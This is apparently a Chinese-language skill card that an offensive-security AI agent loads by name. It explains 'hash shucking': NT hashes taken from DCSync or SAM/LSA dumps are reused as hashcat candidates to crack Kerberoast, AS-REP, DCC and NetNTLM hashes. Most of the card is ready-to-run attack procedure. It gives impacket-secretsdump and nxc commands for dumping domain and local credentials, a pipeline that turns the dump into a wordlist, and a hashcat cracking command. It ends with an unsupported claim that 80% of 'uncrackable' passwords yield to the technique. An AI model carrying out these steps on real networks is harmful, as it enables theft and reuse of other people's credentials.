---
name: 'hash-shucking'
description: 'Hash Shucking：NT hash作为其他格式候选密码。hashcat NT-candidate模式31500/31600/35300/35400。'
disable-model-invocation: true
metadata: { domain: creds, tier: T2 }
---
> 📌 DSH 用法：用 skill 工具按名加载本卡。

## Hash Shucking — NT Hash 作为其他格式的候选密码

### 原理
NT hash 本质是 MD4(UTF16LE(password))。当你有一批 NT hash 时（DCSync、SAM dump 等），可以把它们当作 wordlist 喂给 hashcat 的 NT-candidate 模式——不需要先破解出明文，直接验证密码复用。

### 场景
- DCSync 后拿到几百个 NT hash
- 想快速验证哪些用户在其他域/其他格式中复用了密码
- 长密码（AES Kerberoast $krb5tgs$18$）破解不动 → 先用 NT hash 排一遍

### 构建 NT 候选库
```bash
# DCSync 含历史
impacket-secretsdump domain/user@DC -just-dc-ntlm -history -user-status -outputfile dump
grep -i ':::' dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt

# 本机 SAM/SECURITY dump
nxc smb <ip> -u admin -p pass --local-auth --lsa
```text

### Hashcat NT-Candidate 模式
| 目标格式 | 普通模式 | NT-Candidate 模式 |
|----------|---------|-------------------|
| Domain Cached Credentials (DCC1) | 1100 | 31500 |
| Domain Cached Credentials 2 (DCC2) | 2100 | 31600 |
| NetNTLMv1 (+ESS) | 5500 | 27000 |
| NetNTLMv2 | 5600 | 27100 |
| Kerberoast ($krb5tgs$23$) | 13100 | 35300 |
| ASREP ($krb5asrep$23$) | 18200 | 35400 |

```bash
hashcat -m 35300 kerberoast.hash nt_candidates.txt --disable-potfile
```text

### 限制
- 只对 RC4 加密类型有效（Kerberos 模式 35300/35400，etype 23）
- AES (etype 17/18) 不适用——Key 不是 NT hash 派生
- 不能用规则引擎（-r / hybrid），会破坏候选 key

### 实战价值
DCSync 后 80% 的"不可破解"密码可以通过 NT-passthrough 验证密码复用，无需碰明文。
